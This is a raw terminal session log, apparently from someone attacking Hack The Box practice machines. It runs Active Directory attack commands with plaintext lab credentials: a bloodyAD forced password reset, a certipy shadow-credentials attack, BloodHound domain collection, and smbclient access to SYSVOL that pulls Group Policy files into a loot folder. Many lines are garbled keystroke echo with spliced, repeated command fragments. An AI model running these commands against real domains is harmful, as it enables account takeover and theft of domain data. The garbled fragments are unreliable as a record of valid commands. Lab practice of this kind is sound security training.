+[2026-01-28 12:26:03] [w=1:tmux] [p=%1] [OUT] bbbloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 set password 'management_svc' 'Newpassword123!'blbloblooooddh
+[2026-01-28 12:27:08] [w=1:tmux] [p=%1] [OUT] ound-python -u judith.mader -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --ziphoouunndbloodhoundd-bloodhound--ppyytthhoonbloodhound-pythonn n -u-p 'judith09' -d-ns--dns-tcp -c--zip - -d d   c ce er rt ti if fi ie ed l -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipe -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipi -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipfi v -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipi -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zip- -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipj -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipa -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipm -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipe -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zips -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipd   c ce er rt ti . -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipj -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipa -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipm -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipe -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zips -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zipbloodhound-python -u-p 'judith09' -d-ns--dns-tcp -c--zipbloodhound-python -u-p 'judith09' -d-ns--dns-tcp -c--zip' -d  ' -d c ' -d ce ' -d cer ' -d cert ' -d certi if fi KingofAkron2025!' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zip         p.htb -ns 10.129.231.186 --dns-tcp -c All --zip[.htb -ns 10.129.231.186 --dns-tcp -c All --zip[ u.htb -ns 10.129.231.186 --dns-tcp -c All --zipp.htb -ns 10.129.231.186 --dns-tcp -c All --zipp.htb -ns 10.129.231.186 --dns-tcp -c All --zipy.htb -ns 10.129.231.186 --dns-tcp -c All --zip     2 --dns-tcp -c All --zip. --dns-tcp -c All --zip7 --dns-tcp -c All --zip5 --dns-tcp -c All --zipbloodhound-python -u-p 'KingofAkron2025!' -d-ns--dns-tcp -c--zippOOBbloodhound-python -u-p 'KingofAkron2025!' -d-ns--dns-tcp -c--zipOB
+[2026-01-28 12:27:08] [pane=%1] [CMD_START] bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.232.75 --dns-tcp -c All --zipOB
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-d DOMAIN] [-v] [-u USERNAME]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] [-p PASSWORD] [-k] [--hashes HASHES] [-no-pass] [-aesKey hex key]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] [--auth-method {auto,ntlm,kerberos}] [-ns NAMESERVER] [--dns-tcp]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] [--dns-timeout DNS_TIMEOUT] [-dc HOST] [-gc HOST] [-w WORKERS]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] [--exclude-dcs] [--disable-pooling] [--disable-autogc] [--zip]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] [--computerfile COMPUTERFILE] [--cachefile CACHEFILE]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] [--ldap-channel-binding] [--use-ldaps] [-op PREFIX_NAME]
+[2026-01-28 12:27:09] [w=1:tmux] [p=%1] [OUT] bloodhound-python: error: unrecognized arguments: --zipOB
+[2026-01-28 12:27:12] [w=1:tmux] [p=%1] [OUT] cccertipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186cd
+[2026-01-28 12:27:19] [w=1:tmux] [p=%1] [OUT] cd ../logscd cd P      PPuuppy//bblloooodhound/d 
+[2026-01-28 12:27:19] [pane=%1] [CMD_START] cd Puppy/bloodhound
+[2026-01-28 12:27:28] [pane=%1] [CMD_START] bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.232.75 --dns-tcp -c All --zip
+[2026-01-28 12:27:28] [w=1:tmux] [p=%1] [OUT] INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+[2026-01-28 12:27:28] [w=1:tmux] [p=%1] [OUT] INFO: Found AD domain: puppy.htb
+[2026-01-28 12:27:28] [w=1:tmux] [p=%1] [OUT] INFO: Getting TGT for user
+[2026-01-28 12:27:28] [w=1:tmux] [p=%1] [OUT] WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
+[2026-01-28 12:27:28] [w=1:tmux] [p=%1] [OUT] INFO: Connecting to LDAP server: dc.puppy.htb
+[2026-01-28 12:27:30] [w=1:tmux] [p=%1] [OUT] INFO: Found 1 domains
+[2026-01-28 12:27:30] [w=1:tmux] [p=%1] [OUT] INFO: Found 1 domains in the forest
+[2026-01-28 12:27:30] [w=1:tmux] [p=%1] [OUT] INFO: Found 1 computers
+[2026-01-28 12:27:30] [w=1:tmux] [p=%1] [OUT] INFO: Connecting to LDAP server: dc.puppy.htb
+[2026-01-28 12:27:31] [w=1:tmux] [p=%1] [OUT] INFO: Found 10 users
+[2026-01-28 12:27:31] [w=1:tmux] [p=%1] [OUT] INFO: Found 56 groups
+[2026-01-28 12:27:31] [w=1:tmux] [p=%1] [OUT] INFO: Found 3 gpos
+[2026-01-28 12:27:31] [w=1:tmux] [p=%1] [OUT] INFO: Found 3 ous
+[2026-01-28 12:27:32] [w=1:tmux] [p=%1] [OUT] INFO: Found 19 containers
+[2026-01-28 12:27:32] [w=1:tmux] [p=%1] [OUT] INFO: Found 0 trusts
+[2026-01-28 12:27:32] [w=1:tmux] [p=%1] [OUT] INFO: Starting computer enumeration with 10 workers
+[2026-01-28 12:27:32] [w=1:tmux] [p=%1] [OUT] INFO: Querying computer: DC.PUPPY.HTB
+[2026-01-28 12:27:35] [w=1:tmux] [p=%1] [OUT] INFO: Done in 00M 06S
+[2026-01-28 12:27:35] [w=1:tmux] [p=%1] [OUT] INFO: Compressing output into 20260128122728_bloodhound.zip
+[2026-01-28 12:27:57] [w=0:tmux] [p=%0] [OUT] b map -u 'judith.mader' -p 'judith09' -d certified.htb -H 10.129.231.186 -r | tee smbmapJudithMader.txtbc
+[2026-01-28 12:27:57] [w=0:tmux] [p=%0] [OUT] lient //10.129.63.111/ -U "ca_svc"%'Password123!' --sharescllk
+[2026-01-28 12:28:06] [w=0:tmux] [p=%0] [OUT] l ient //10.129.63.111/ -U "ca_svc"%'Password123!' --sharesliieenntsmbclientt t //////-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --shares
+[2026-01-28 12:28:15] [w=0:tmux] [p=%0] [OUT] smbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharessmbclient-U "ca_svc"%'Password123!' --sharesc" "% %' 'P Pas as 2/ -U "ca_svc"%'Password123!' --shares3/ -U "ca_svc"%'Password123!' --shares2/ -U "ca_svc"%'Password123!' --shares./ -U "ca_svc"%'Password123!' --shares7/ -U "ca_svc"%'Password123!' --shares5/ -U "ca_svc"%'Password123!' --shares
+[2026-01-28 12:28:18] [w=0:tmux] [p=%0] [OUT] 
+[2026-01-28 12:28:21] [w=0:tmux] [p=%0] [OUT] "% "%' "%'P "%'Pas "%'Pas l"%'Password123!' --sharese"%'Password123!' --sharesv"%'Password123!' --sharesi"%'Password123!' --shares."%'Password123!' --shares
+[2026-01-28 12:28:22] [w=0:tmux] [p=%0] [OUT] j"%'Password123!' --shares
+[2026-01-28 12:28:57] [w=0:tmux] [p=%0] [OUT] ja"%'Password123!' --sharesm"%'Password123!' --sharesd"%'Password123!' --sharese"%'Password123!' --shares  e"%'Password123!' --sharess"%'Password123!' --sharessmbclient-U "levi.james"%'Password123!' --sharessmbclient-U "levi.james"%'Password123!' --sharessmbclient-U "levi.james"%'Password123!' --sharessmbclient-U "levi.james"%'Password123!' --shares            KingofAkron2025!' --sharese r a h s - -    
+[2026-01-28 12:28:57] [pane=%0] [CMD_START] smbclient //10.129.232.75/ -U "levi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:05] [w=0:tmux] [p=%0] [OUT] smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'smbclient-U "levi.james"%'KingofAkron2025!'Plevi.james"%'KingofAkron2025!'Ulevi.james"%'KingofAkron2025!'Plevi.james"%'KingofAkron2025!'Plevi.james"%'KingofAkron2025!'Ylevi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:07] [w=0:tmux] [p=%0] [OUT] .levi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:13] [w=0:tmux] [p=%0] [OUT] .Hlevi.james"%'KingofAkron2025!'Tlevi.james"%'KingofAkron2025!'Blevi.james"%'KingofAkron2025!'\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:13] [pane=%0] [CMD_START] smbclient //10.129.232.75/ -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:23] [w=0:tmux] [p=%0] [OUT] PY.HTB\levi.james"%'KingofAkron2025!'V -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:23] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:29:24] [w=0:tmux] [p=%0] [OUT] Try "help" to get a list of possible commands.
+[2026-01-28 12:29:26] [w=0:tmux] [p=%0] [OUT] smb: \> dir
+[2026-01-28 12:29:26] [w=0:tmux] [p=%0] [OUT] NT_STATUS_ACCESS_DENIED listing \*
+[2026-01-28 12:29:28] [w=0:tmux] [p=%0] [OUT] smb: \> ls
+[2026-01-28 12:29:28] [w=0:tmux] [p=%0] [OUT] NT_STATUS_ACCESS_DENIED listing \*
+[2026-01-28 12:29:30] [w=0:tmux] [p=%0] [OUT] smb: \> cd ..
+[2026-01-28 12:29:31] [w=0:tmux] [p=%0] [OUT] smb: \> dir
+[2026-01-28 12:29:31] [w=0:tmux] [p=%0] [OUT] NT_STATUS_ACCESS_DENIED listing \*
+[2026-01-28 12:29:46] [w=0:tmux] [p=%0] [OUT] smb: \> recurese rse on
+[2026-01-28 12:29:50] [w=0:tmux] [p=%0] [OUT] smb: \> ls
+[2026-01-28 12:29:50] [w=0:tmux] [p=%0] [OUT] NT_STATUS_ACCESS_DENIED listing \*
+[2026-01-28 12:29:59] [w=0:tmux] [p=%0] [OUT] smb: \> exit
+[2026-01-28 12:30:19] [w=0:tmux] [p=%0] [OUT] -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:30:32] [w=0:tmux] [p=%0] [OUT] f -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'o -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'r -U "PUPPY.HTB\levi.james"%'KingofAkron2025!' -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'P -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'Y -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'smbclient'DEV-SHARE for PY -U "PUPPY.HTB\levi.james"%''U -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'smbclient'DEV-SHARE for PYU -U "PUPPY.HTB\levi.james"%''  Y -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'P -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'P -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'   P -U "PUPPY.HTB\levi.james"%'KingofAkron2025!' U -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'P -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'P -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'Y -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'- -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'D -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'E -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'V -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'S -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'' -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'' -U "%'KingofAkron2025!
+[2026-01-28 12:30:32] [pane=%0] [CMD_START] smbclient //10.129.232.75/'DEV-SHARE for PUPPY-DEVS' -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:30:32] [w=0:tmux] [p=%0] [OUT] tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+[2026-01-28 12:30:48] [w=0:tmux] [p=%0] [OUT] smbclient'DEV-SHARE for PUPPY-DEVS -U "PUPPY.HTB\levi.james"%''smbclient'DEV-SHARE for PUPPY-DEVS -U "PUPPY.HTB\levi.james"%'' f DEV-SHARE for PUPPY-DEVS -U "%'KingofAkron2025!
+[2026-01-28 12:30:48] [pane=%0] [CMD_START] smbclient //10.129.232.75/DEV-SHARE for PUPPY-DEVS -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 12:30:49] [w=0:tmux] [p=%0] [OUT] tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+[2026-01-28 13:43:29] [w=0:tmux] [p=%0] [OUT] smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!'smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 13:43:34] [w=0:tmux] [p=%0] [OUT] smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!'smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!'    smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!' smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!'    smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!' smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!' smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!' smbclient-U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 13:43:34] [w=0:tmux] [p=%0] [OUT] f
+[2026-01-28 13:43:36] [w=0:tmux] [p=%0] [OUT]  -U  -U   -U "  -U "P  -U "PUP  -U "PUP  -U "PUPP  -U "PUP
+[2026-01-28 13:43:37] [w=0:tmux] [p=%0] [OUT] Y. S -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'Y -U "PU
+[2026-01-28 13:43:42] [w=0:tmux] [p=%0] [OUT] PY.HTB\levi.james"%'KingofAkron2025!'S -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'V -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'O -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'L -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 13:43:42] [pane=%0] [CMD_START] smbclient //10.129.232.75/SYSVOL -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-01-28 13:43:42] [w=0:tmux] [p=%0] [OUT] Try "help" to get a list of possible commands.
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] smb: \> dir
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Fri Mar 21 01:33:44 2025
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:44:57 2025
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] lvRxjnmZBA                          D        0  Fri Mar 21 01:33:44 2025
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] PUPPY.HTB                          Dr        0  Wed Feb 19 06:44:57 2025
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] UltFsQYRGg.txt                      A        0  Fri Mar 21 01:33:44 2025
+[2026-01-28 13:43:44] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641971 blocks available
+[2026-01-28 13:43:56] [w=0:tmux] [p=%0] [OUT] smb: \> get UltFsQYRGg.txt
+[2026-01-28 13:43:56] [w=0:tmux] [p=%0] [OUT] getting file \UltFsQYRGg.txt of size 0 as UltFsQYRGg.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+[2026-01-28 13:44:07] [w=0:tmux] [p=%0] [OUT] smb: \> cd PuUPPY.HTB\
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\> dir
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:46:56 2025
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:44:57 2025
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] DfsrPrivate                      DHSr        0  Wed Feb 19 06:46:56 2025
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] Policies                            D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] scripts                             D        0  Fri Mar 21 01:33:44 2025
+[2026-01-28 13:44:08] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641971 blocks available
+[2026-01-28 13:44:16] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\> cd Policies
+[2026-01-28 13:44:17] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\> dir
+[2026-01-28 13:44:17] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:44:17] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:46:56 2025
+[2026-01-28 13:44:17] [w=0:tmux] [p=%0] [OUT] {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:44:17] [w=0:tmux] [p=%0] [OUT] {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:44:17] [w=0:tmux] [p=%0] [OUT] {841B611C-9F3B-4090-BA0C-2AE4D6C02AF8}      D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:44:18] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641971 blocks available
+[2026-01-28 13:44:32] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\> get {31B2F340-016D-11D2-945F-00C04FB984F9}\
+[2026-01-28 13:44:32] [w=0:tmux] [p=%0] [OUT] NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
+[2026-01-28 13:44:39] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}\
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> dir
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Tue May 13 19:42:57 2025
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] GPT.INI                             A       22  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] MACHINE                             D        0  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] USER                                D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:44:40] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641971 blocks available
+[2026-01-28 13:44:50] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> type GPT,.INI
+[2026-01-28 13:44:50] [w=0:tmux] [p=%0] [OUT] type: command not found
+[2026-01-28 13:44:56] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> read GPtT.INI
+[2026-01-28 13:44:56] [w=0:tmux] [p=%0] [OUT] NT_STATUS_NOT_A_REPARSE_POINT readlink on file \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI
+[2026-01-28 13:45:09] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> get GPT.INI
+[2026-01-28 13:45:10] [w=0:tmux] [p=%0] [OUT] getting file \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as GPT.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+[2026-01-28 13:45:15] [pane=%1] [CMD_START] cd ..
+[2026-01-28 13:45:17] [w=1:tmux] [p=%1] [OUT] rdirdir
+[2026-01-28 13:45:17] [pane=%1] [CMD_START] dir
+[2026-01-28 13:45:17] [w=1:tmux] [p=%1] [OUT] attack-chain.md  bloodhound  evidence  ffuf  logs  loot  nmap  Puppy\ writeup.md
+[2026-01-28 13:45:19] [pane=%1] [CMD_START] ll
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] total 32
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30  186 Jan 28  2026  attack-chain.md
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 12:27  bloodhound
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28  2026  evidence
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28  2026  ffuf
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28  2026  logs
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28  2026  loot
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 13:45  nmap
+[2026-01-28 13:45:19] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30  125 Jan 28  2026 'Puppy writeup.md'
+[2026-01-28 13:45:32] [pane=%1] [CMD_START] cd nmap
+[2026-01-28 13:45:33] [pane=%1] [CMD_START] ll
+[2026-01-28 13:45:33] [w=1:tmux] [p=%1] [OUT] total 12
+[2026-01-28 13:45:33] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30   22 Jan 28 13:45 GPT.INI
+[2026-01-28 13:45:33] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 1443 Jan 28  2026 puppyNmapOpenPorts.txt
+[2026-01-28 13:45:33] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30 2830 Jan 28 11:09 puppyNmapServicesVersions.txt
+[2026-01-28 13:45:33] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    0 Jan 28 13:43 UltFsQYRGg.txt
+[2026-01-28 13:45:38] [w=1:tmux] [p=%1] [OUT] GPT.INI GptTmpl.inf \{31B2F340-016D-11D2-945F-00C04FB984F9\}GP11PT1DT.INI D U
+[2026-01-28 13:45:47] [w=1:tmux] [p=%1] [OUT]  UtUt UUlleUle UllttFsQYRGg.txt  . ...//lloot../lot ../loooott/t 
+[2026-01-28 13:45:47] [pane=%1] [CMD_START] mv GPT.INI UltFsQYRGg.txt ../loot
+[2026-01-28 13:45:49] [pane=%1] [CMD_START] cd ..
+[2026-01-28 13:45:52] [pane=%1] [CMD_START] cd loot
+[2026-01-28 13:45:52] [pane=%1] [CMD_START] dir
+[2026-01-28 13:45:52] [w=1:tmux] [p=%1] [OUT] credentials.md	GPT.INI  UltFsQYRGg.txt
+[2026-01-28 13:45:57] [pane=%1] [CMD_START] cat GPT.INI
+[2026-01-28 13:45:57] [w=1:tmux] [p=%1] [OUT] [General]
+[2026-01-28 13:45:57] [w=1:tmux] [p=%1] [OUT] Version=3
+[2026-01-28 13:46:01] [w=1:tmux] [p=%1] [OUT] Completing `file'
+[2026-01-28 13:46:03] [w=1:tmux] [p=%1] [OUT] gat Utlgat  UUllttFsQYRGg.txt  
+[2026-01-28 13:46:03] [pane=%1] [CMD_START] gat UltFsQYRGg.txt
+[2026-01-28 13:46:03] [w=1:tmux] [p=%1] [OUT] Command 'gat' not found, but there are 17 similar ones.
+[2026-01-28 13:46:07] [pane=%1] [CMD_START] cat Ulq
+[2026-01-28 13:46:07] [w=1:tmux] [p=%1] [OUT] cat: Ulq: No such file or directory
+[2026-01-28 13:46:09] [pane=%1] [CMD_START] cat UltFsQYRGg.txt
+[2026-01-28 13:47:03] [w=1:tmux] [p=%1] [OUT] Completing `file'
+[2026-01-28 13:47:12] [w=1:tmux] [p=%1] [OUT] mkdir {31B2F340-016D-11D2-945F-00C04FB984F9} & mv UltFsQYRGg.txt GPT.INI {3mkdir {} & mv UltFsQYRGg.txt GPT.INI {  {31B2F340-016D-11D2-945F-00C04FB984F9}{}
+[2026-01-28 13:47:12] [pane=%1] [CMD_START] mkdir {31B2F340-016D-11D2-945F-00C04FB984F9} & mv UltFsQYRGg.txt GPT.INI {31B2F340-016D-11D2-945F-00C04FB984F9}
+[2026-01-28 13:47:12] [w=1:tmux] [p=%1] [OUT] [1] 1543483
+[2026-01-28 13:47:12] [w=1:tmux] [p=%1] [OUT] [1]  + done       mkdir {31B2F340-016D-11D2-945F-00C04FB984F9}
+[2026-01-28 13:47:14] [pane=%1] [CMD_START] ll
+[2026-01-28 13:47:14] [w=1:tmux] [p=%1] [OUT] total 8
+[2026-01-28 13:47:14] [w=1:tmux] [p=%1] [OUT] drwxrwxr-x 2 b7h30 b7h30 4096 Jan 28 13:47 {31B2F340-016D-11D2-945F-00C04FB984F9}
+[2026-01-28 13:47:14] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30  167 Jan 28  2026 credentials.md
+[2026-01-28 13:49:32] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MachiACHINE\
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> dir
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] .                                   D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] ..                                  D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] Microsoft                           D        0  Wed Feb 19 06:45:13 2025
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] Registry.pol                        A     2786  Wed Feb 19 06:49:00 2025
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] Scripts                             D        0  Wed May 14 12:54:14 2025
+[2026-01-28 13:49:33] [w=0:tmux] [p=%0] [OUT] 5080575 blocks of size 4096. 1641907 blocks available
+[2026-01-28 13:49:51] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> gt et Registruy.pol
+[2026-01-28 13:49:51] [w=0:tmux] [p=%0] [OUT] getting file \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2786 as Registry.pol (20.8 KiloBytes/sec) (average 7.9 KiloBytes/sec)
+[2026-01-28 13:49:56] [w=0:tmux] [p=%0] [OUT] smb: \PUPPY.HTB\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Microsoft
